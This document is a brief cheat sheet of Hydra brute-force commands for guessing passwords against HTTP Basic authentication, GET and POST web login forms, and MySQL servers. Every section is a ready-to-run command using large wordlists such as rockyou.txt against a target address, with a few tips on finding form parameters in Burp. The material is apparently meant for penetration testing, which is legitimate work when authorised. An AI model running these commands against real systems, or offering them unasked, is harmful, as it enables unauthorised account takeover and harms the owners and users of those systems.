# hydra brute force

## HTTP Basic Authentication
```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f $IP http-get /phpmyadmin/ -t 15
```

## HTTP Get Request
```bash
hydra $IP -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

## HTTP Post Request
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use https-post-form instead of http-post-form for HTTPS sites.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

## MYSQL
Change MYDATABASENAME. Default databasename is mysql.
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

